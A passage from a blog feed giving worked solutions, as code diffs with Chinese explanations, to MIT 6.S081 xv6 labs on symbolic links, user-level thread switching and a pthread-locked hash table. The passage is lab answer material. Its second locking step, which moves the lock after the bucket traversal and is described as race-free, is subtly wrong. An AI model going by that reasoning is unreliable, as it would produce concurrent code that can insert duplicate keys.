number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// get inode of file in the path</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>next <span class="token operator">=</span> <span class="token function">namei</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>        ip <span class="token operator">=</span> next<span class="token punctuation">;</span>        <span class="token operator">--</span>depth<span class="token punctuation">;</span>        <span class="token function">ilock</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>depth <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 7a7e380..37a202c 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -188,6 +188,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_symlinktest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/fcntl.h b/kernel/fcntl.hindex 44861b9..b42df18 100644<span class="token coord">--- a/kernel/fcntl.h</span><span class="token coord">+++ b/kernel/fcntl.h</span><span class="token coord">@@ -3,3 +3,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define O_RDWR    0x002</span><span class="token prefix unchanged"> </span><span class="token line">#define O_CREATE  0x200</span><span class="token prefix unchanged"> </span><span class="token line">#define O_TRUNC   0x400</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define O_NOFOLLOW 0x800</span></span>\ No newline at end of filediff --git a/kernel/stat.h b/kernel/stat.hindex 19543af..46ba47f 100644<span class="token coord">--- a/kernel/stat.h</span><span class="token coord">+++ b/kernel/stat.h</span><span class="token coord">@@ -1,6 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define T_DIR     1   // Directory</span><span class="token prefix unchanged"> </span><span class="token line">#define T_FILE    2   // File</span><span class="token prefix unchanged"> </span><span class="token line">#define T_DEVICE  3   // Device</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define T_SYMLINK 4   // Symbol link</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">struct stat &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  int dev;     // File system's disk device</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..1697b62 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_symlink(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +128,7 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_symlink] sys_symlink,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..0fbf6ed 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_symlink 22</span></span>\ No newline at end of filediff --git a/kernel/sysfile.c b/kernel/sysfile.cindex 5dc453b..ae342c8 100644<span class="token coord">--- a/kernel/sysfile.c</span><span class="token coord">+++ b/kernel/sysfile.c</span><span class="token coord">@@ -15,6 +15,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "sleeplock.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "file.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "fcntl.h"</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "buf.h"</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Fetch the nth word-sized system call argument as a file descriptor</span><span class="token prefix unchanged"> </span><span class="token line">// and return both the descriptor and the corresponding struct file.</span></span>@@ -316,6 +317,35 @@ sys_open(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (!(omode &amp; O_NOFOLLOW)) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    int depth = 10;</span><span class="token prefix inserted">+</span><span class="token line">    struct inode *next;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    while (depth > 0 &amp;&amp; ip->type == T_SYMLINK) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      if (readi(ip, 0, (uint64)path, 0, MAXPATH) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">        end_op();</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">      if ((next = namei(path)) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">        end_op();</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">      ip = next;</span><span class="token prefix inserted">+</span><span class="token line">      --depth;</span><span class="token prefix inserted">+</span><span class="token line">      ilock(ip);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    if (depth &lt;= 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">      end_op();</span><span class="token prefix inserted">+</span><span class="token line">      return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(ip->type == T_DEVICE &amp;&amp; (ip->major &lt; 0 || ip->major >= NDEV))&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    iunlockput(ip);</span><span class="token prefix unchanged"> </span><span class="token line">    end_op();</span></span>@@ -484,3 +514,28 @@ sys_pipe(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_symlink(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  int n1, n2;</span><span class="token prefix inserted">+</span><span class="token line">  char target[MAXPATH], path[MAXPATH];</span><span class="token prefix inserted">+</span><span class="token line">  struct inode *ip;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  if ((n1 = argstr(0, target, MAXPATH)) &lt; 0 || (n2 = argstr(1, path, MAXPATH)) &lt; 1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // create symbol link in the path</span><span class="token prefix inserted">+</span><span class="token line">  begin_op();</span><span class="token prefix inserted">+</span><span class="token line">  if ((ip = create(path, T_SYMLINK, 0, 0)) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    end_op();</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (writei(ip, 0, (uint64)target, 0, n1) &lt; n1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    end_op();</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">  end_op();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..883ef48 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,7 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int symlink(char *, char *);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..65a8d6b 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,4 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("symlink");</span></span>\ No newline at end of file</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Large-files&quot;&gt;&lt;a href=&quot;#Large-files&quot; class=&quot;headerlink&quot; title=&quot;Large files&quot;&gt;&lt;/a&gt;Large files&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;head</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Multithreading</title>
    <link href="http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/"/>
    <id>http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/</id>
    <published>2024-08-13T10:03:11.000Z</published>
    <updated>2024-08-14T08:16:25.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>xv6 已经实现了进程的切换机制，本实验要求参考进程的切换，实现一个用户态线程的切换。</p><p>要实现线程切换，必然涉及上下文，即寄存器的保存和恢复，那么需要保存哪些寄存器？实际上，只需要保存被调用者保存寄存器（callee-saved registers），而实现调用者保存寄存器（caller-saved registers）的保存与恢复的代码由编译器自动生成。关于调用者保存与被调用者保存寄存器有哪些可以参照下述 RISC-V 的 calling convention：</p><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/call.png" alt></p><p>另外，根据 <code>user/uthread_switch.S</code> 的注释，<code>thread_switch</code> 最后通过 <code>ret</code> 指令将当前程序计数器的值切换为 ra 寄存器中存储的地址，实现进程的“切换”，因此 <code>struct thread</code> 中还需要保存每个线程对应程序的起始地址（即函数指针）。</p><p>在了解需要保存哪些寄存器之后以及如何进行线程切换之后，还有一个细节需要考虑，即栈指针寄存器（sp）的初始化。线程栈的存储位置为 <code>struct thread</code> 中的 <code>stack</code> 数组，那么 sp 应该指向 <code>stack</code> 的位置，但由于栈的地址从大到小增长，因此 <code>sp</code> 应该初始化为 <code>(uint64)t-&gt;stack + STACK_SIZE</code>.</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/user/uthread.c b/user/uthread.cindex 06349f5..74b7f20 100644<span class="token coord">--- a/user/uthread.c</span><span class="token coord">+++ b/user/uthread.c</span><span class="token coord">@@ -12,6 +12,20 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">struct thread &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  /* 0 */  uint64 ra;</span><span class="token prefix inserted">+</span><span class="token line">  /* 8 */  uint64 sp;</span><span class="token prefix inserted">+</span><span class="token line">  /* 16 */  uint64 s0;</span><span class="token prefix inserted">+</span><span class="token line">  /* 24 */ uint64 s1;</span><span class="token prefix inserted">+</span><span class="token line">  /* 32 */ uint64 s2;</span><span class="token prefix inserted">+</span><span class="token line">  /* 40 */ uint64 s3;</span><span class="token prefix inserted">+</span><span class="token line">  /* 48 */ uint64 s4;</span><span class="token prefix inserted">+</span><span class="token line">  /* 56 */ uint64 s5;</span><span class="token prefix inserted">+</span><span class="token line">  /* 64 */ uint64 s6;</span><span class="token prefix inserted">+</span><span class="token line">  /* 72 */ uint64 s7;</span><span class="token prefix inserted">+</span><span class="token line">  /* 80 */ uint64 s8;</span><span class="token prefix inserted">+</span><span class="token line">  /* 88 */ uint64 s9;</span><span class="token prefix inserted">+</span><span class="token line">  /* 96 */ uint64 s10;</span><span class="token prefix inserted">+</span><span class="token line">  /* 104 */ uint64 s11;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  char       stack[STACK_SIZE]; /* the thread's stack */</span><span class="token prefix unchanged"> </span><span class="token line">  int        state;             /* FREE, RUNNING, RUNNABLE */</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -62,6 +76,7 @@ thread_schedule(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">     * Invoke thread_switch to switch from t to next_thread:</span><span class="token prefix unchanged"> </span><span class="token line">     * thread_switch(??, ??);</span><span class="token prefix unchanged"> </span><span class="token line">     */</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">thread_switch((uint64)t, (uint64)current_thread);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else</span><span class="token prefix unchanged"> </span><span class="token line">    next_thread = 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -76,6 +91,8 @@ thread_create(void (*func)())<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  t->state = RUNNABLE;</span><span class="token prefix unchanged"> </span><span class="token line">  // YOUR CODE HERE</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  t->ra = (uint64)func;</span><span class="token prefix inserted">+</span><span class="token line">  t->sp = (uint64)t->stack + STACK_SIZE;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void </span></span>diff --git a/user/uthread_switch.S b/user/uthread_switch.Sindex 5defb12..0eb0a2c 100644<span class="token coord">--- a/user/uthread_switch.S</span><span class="token coord">+++ b/user/uthread_switch.S</span><span class="token coord">@@ -7,5 +7,34 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">.globl thread_switch</span><span class="token prefix unchanged"> </span><span class="token line">thread_switch:</span></span>/* YOUR CODE HERE */<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">sd ra, 0(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd sp, 8(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s0, 16(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s1, 24(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s2, 32(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s3, 40(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s4, 48(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s5, 56(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s6, 64(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s7, 72(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s8, 80(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s9, 88(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s10, 96(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s11, 104(a0)</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">ld ra, 0(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld sp, 8(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s0, 16(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s1, 24(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s2, 32(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s3, 40(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s4, 48(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s5, 56(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s6, 64(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s7, 72(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s8, 80(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s9, 88(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s10, 96(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s11, 104(a1)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">ret    /* return to ra */</span></span></code></pre><h1 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>后两个实验与 xv6 无关，而是练习使用 POSIX 线程库在实际的 Linux 平台进行并发编程。</p><p>本实验要求使用锁机制，实现一个支持并发的哈希表。首先需要确定的是：哪部分的操作会出现竞态（race condition）？根据观察不难得知 <code>put()</code> 操作可能存在下面这种情况：</p><blockquote><p>线程 1 和线程 2 本次 <code>put()</code> 映射到一个桶中（i 相同），都执行完 line 46 ~ 49 的循环之后，e 都为 0，随后先后执行 <code>insert()</code>，都创建一个新的 entry，并先后更新 <code>table[i]</code> 的值，导致先插入的键被覆盖。<br>像这样，在一次插入操作未完成的情况下，另一次插入也开始进行且映射到一个桶中，就会导致丢键（keys missing）的情况发生。</p></blockquote><p>首先最简单无脑的办法就是给整个 <code>put()</code> 函数加一把大锁：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock1.png" alt></p><p>可以看到，keys missing 的问题已经被解决，但是大锁带来的就是更低的性能，实际上根据上图可知，该实现在双核情况下的运行速度甚至慢于单核。</p><p>实际上，对 <code>table</code> 数组的遍历并不会导致竞态，因此将加锁的操作延迟到遍历结束后：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock2.png" alt></p><p>做了上述修改后，仍然没有出现 key missing 的情况，同时效率提升了一倍以上。</p><p>最后，更细化一些，只有当两个 <code>put()</code> 映射到同一个桶时才会发生竞态，因此可以为每个桶分别设置一把锁，以进一步提高并发性：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock3.png" alt></p><p>可见，效率又有进一步提升。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/ph.c b/notxv6/ph.cindex 82afe76..321e269 100644<span class="token coord">--- a/notxv6/ph.c</span><span class="token coord">+++ b/notxv6/ph.c</span>@@ -17,6 +17,7 @@ struct entry *table[NBUCKET];<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int keys[NKEYS];</span><span class="token prefix unchanged"> </span><span class="token line">int nthread = 1;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pthread_mutex_t locks[NBUCKET];</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">double</span><span class="token prefix unchanged"> </span><span class="token line">now()</span></span>@@ -47,6 +48,7 @@ void put(int key, int value)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    if (e->key == key)</span><span class="token prefix unchanged"> </span><span class="token line">      